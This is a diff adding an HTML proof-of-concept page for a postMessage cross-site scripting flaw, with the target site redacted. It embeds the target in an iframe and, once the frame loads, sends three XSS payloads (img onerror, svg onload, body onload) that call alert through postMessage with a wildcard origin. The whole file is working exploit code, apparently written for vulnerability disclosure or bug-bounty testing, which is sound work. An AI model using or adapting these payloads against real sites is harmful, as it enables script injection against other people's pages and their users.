@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC for PostMessage XSS</title>
+</head>
+<body>
+    <iframe id="targetFrame" src="https://redacted.com" style="width: 100%; height: 500px;"></iframe>
+    <script>
+        function sendMessage(payload) {
+            var targetWindow = document.getElementById('targetFrame').contentWindow;
+            console.log('Sending message:', payload);
+            targetWindow.postMessage(payload, "*");
+        }
+
+        document.getElementById('targetFrame').onload = function() {
+            console.log('Iframe loaded, sending messages');
+            sendMessage("<img src=x onerror=alert('XSS')>");
+            sendMessage("<svg onload=alert('XSS')>");
+            sendMessage("<body onload=alert('XSS')>");
+        };
+
+        window.addEventListener('message', function(event) {
+            console.log('Received message:', event.data);
+        });
+    </script>
+</body>
+</html>
